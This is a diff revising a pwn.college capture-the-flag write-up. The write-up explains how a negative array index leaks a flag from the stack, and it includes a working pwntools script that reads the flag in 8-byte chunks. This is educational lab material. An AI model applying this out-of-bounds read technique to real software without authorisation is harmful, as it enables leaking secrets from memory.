@@ -1,91 +1,155 @@
 # anomalous-array Writeup - pwn.college
 
 **Category:** Memory Corruption  
-**Difficulty:** Hard
+**Difficulty:** Hard  
 
 This writeup describes the solution to the **"anomalous-array"** challenge from pwn.college.  
-The goal is to exploit an out-of-bounds array access vulnerability in order to read arbitrary memory from the stack and ultimately leak the flag.
+The goal is to exploit an **out-of-bounds array access vulnerability** in order to read arbitrary memory from the stack and ultimately leak the flag.
 
 ---
 
-## Step 1 – First Attempt at Probing
+## Step 1 – Understanding the Challenge
 
 ![Initial Attempt](screenshots/01-initial-attempt.png)
 
-The program expects to number to view. when I choose 1, I saw that the hacker number is 1337c0de. What will happen with another number as an input?
+The program asks the user to choose an index to view.
 
-![Second Attempt To Understand](screenshots/02-second-attempt-to-understand.png)
+When selecting index `1`, the program prints the value `0x1337c0de`.  
+This suggests that the program retrieves values from an internal array.
 
-We will try to enter the standings through DGB.
+![Additional Input Exploration](screenshots/02-additional-input-exploration.png)
 
----
-
-## Step 2 – Observation via GDB
-
-So what we see in Gdb?
-
-![](screenshots/03.png)
-
-These lines This print: "Which number would you like to view?"
-
-![](screenshots/04.png)
-
-After we insert the input with `scanf` function, we see that its take the input (as number) and calculate the hacker number to print:
-
-![](screenshots/05.png)
-
-That is, we have an array that starts at the address: $rbp+8*0xAE-0x7F8 (which is actually: rbp - 0x288), and we enter an index as input. The hacker number that is printed is the array in place of the index we entered.
-This is nice, but where I can find the flag? let's take view about what happen before:
-
-![](screenshots/06.png)
-![](screenshots/07.png)
-
-Beatuiful! This is open the "flag" file, and store the flag on the stack (at rbp - 0x10). But rbp - 0x10 is only a **pointer** to the palce that the flag stored. Where the flag itself is located?
-
-![](screenshots/08.png)
-
-Exactly here - at rbp - 0x800!
+Trying additional inputs confirms that different indices return different values.  
+This indicates that user input is directly used as an array index.
 
 ---
 
-## Step 3 – Identifying the Vulnerability
+## Step 2 – Initial Observation (GDB)
 
-Conclusion from the gdb:
-the start of the array - rbp - 0x288
-the place of the flag - rbp - 0x800 (above to the array)
-so, a regular index will not help to arraive to the flag, but if we insert as an input a nagetive number?
-The negative index that will lead me to the tart of the flag is: - (0x88 - 0x288) / 8 = -0xAF (-175 in dec).
-let's try it:
+To better understand the program’s behavior, we analyze it using GDB.
 
-![](screenshots/09.png)
+![Printf Prompt](screenshots/03-printf-prompt.png)
 
----
+The program first prints the prompt:
 
-## Step 4 – Exploitation Strategy
+```
+Which number would you like to view?
+```
 
-When I examine the printf funtion of the hacker number I duscover 2 problems:
+![Scanf Index Input](screenshots/04-scanf-index-input.png)
 
-![](screenshots/10.png)
+User input is read using `scanf`, which stores the provided index.
 
-1. The format is unsigned long, and I want to print all the flag, not only the 8 first bytes.
-2. The format is hexadecimal, and I want to convert it to string format for see the flag.
+![Array Index Output](screenshots/05-array-index-output.png)
 
-So, I want to build **python** script that will solve these problems - its will execuate the program 32 times (because the length of the flag is maxsimum 0x100, and in each time this prints 8 bytes), and in each time I convert this ti ascii. In the end, I will print the Unification of all chunks of the flag.
-
-![](screenshots/11.png)
+The program then uses this index to access an array and prints the corresponding value.
 
 ---
 
-## Step 5 –  Retrieving the Flag
+## Step 3 – Stack Layout Analysis
 
-I execuated this code and after 32 times got the complete 
-flag:
+By inspecting the disassembly, we can reconstruct the memory layout:
 
-![Exploit success Flag Output](screenshots/13-exploit-success-flag-output.png)
+- Array base address: `rbp - 0x288`
+- Flag location: `rbp - 0x800`
 
-The successful exploitation confirms full control over the program’s execution flow.
+![Flag File Read](screenshots/06-flag-file-read.png)
 
-![Flag Submission Confirmation](screenshots/14-flag-submission-confirmation.png)
+The program opens the `"flag"` file and reads its contents into memory.
+
+![Flag Stack Location](screenshots/07-flag-stack-location.png)
+
+The flag is stored on the stack at `rbp - 0x800`.
+
+This location is **before the array in memory**, meaning it cannot be accessed using standard (positive) indices.
+
+---
+
+## Step 4 – Identifying the Vulnerability
+
+The program does not validate the index provided by the user.
+
+This allows the use of **negative indices**, which access memory *before* the array.
+
+Since the flag is located before the array, this creates an **out-of-bounds read vulnerability**, enabling leakage of the flag.
+
+---
+
+## Step 5 – Calculating the Offset
+
+We compute the index required to reach the flag location:
+
+```
+array base = rbp - 0x288
+flag start = rbp - 0x800
+```
+
+Distance:
+```
+0x800 - 0x288 = 0x578 bytes
+```
+
+Since each array element is 8 bytes:
+```
+index = - (0x578 / 8) = -0xAF (-175)
+```
+
+Using this negative index allows access to the beginning of the flag.
+
+![Negative Index Leak](screenshots/08-negative-index-leak.png)
+
+---
+
+## Step 6 – Exploitation Strategy
+
+![Printf Format Hex](screenshots/09-printf-format-hex.png)
+
+The output is printed using `%lx`, meaning:
+
+- Only **8 bytes** are printed at a time    
+- Output is in **hexadecimal format**  
+
+To reconstruct the full flag:
+
+1. Repeatedly query consecutive indices
+2. Convert each 8-byte chunk from hex to ASCII
+3. Concatenate all chunks
+
+The following script automates this process:
+
+```python
+# exploit.py
+from pwn import *
+flag = b""
+ 
+for index in range(-175, -143):
+    p = process("/challenge/anomalous-array-hard")
+    p.recvuntil(b"Which number would you like to view? ")
+    p.sendline(str(index).encode())
+    p.recvuntil(b"Your hacker number is ")
+    line = p.recvline().decode().strip()
+    val_hex = line.strip().split()[-1]
+    val_int = int(val_hex, 16)
+    chunk = val_int.to_bytes(8, "little")
+
+    flag += chunk
+    p.close()
+
+flag = flag.rstrip(b"\x00")
+print(flag.decode(errors="ignore"))
+```
+
+---
+
+## Step 7 – Retrieving the Flag
+
+Running the script iteratively allows reconstructing the full flag:
+
+![Flag Output](screenshots/10-flag-output.png)
+
+The successful leak confirms that arbitrary stack memory can be read via the vulnerability.
+
+![Flag Submission](screenshots/11-flag-submission.png)
 
 ---
 
@@ -95,9 +159,7 @@ This challenge demonstrates how improper bounds checking on array indices can le
 
 By allowing negative indices, the program enables reading memory located *before* the array on the stack. This makes it possible to leak sensitive data, such as the flag.
 
-Additionally, the challenge highlights an important detail: even when memory is accessed in fixed-size chunks (e.g., 8 bytes), it is still possible to reconstruct larger secrets by repeatedly querying adjacent memory locations.
+Additionally, the challenge highlights that even when memory is accessed in fixed-size chunks (e.g., 8 bytes), it is still possible to reconstruct larger secrets by repeatedly querying adjacent memory locations.
 
-This is a classic example of how **information disclosure vulnerabilities** can arise from seemingly simple logic flaws, without requiring control over execution flow.
-
-להוסיף שאלה לצאט - שיעצב לי את זה
+This is a classic example of an **information disclosure vulnerability**, where a simple logic flaw leads to unintended exposure of sensitive data without requiring control over execution flow.
 
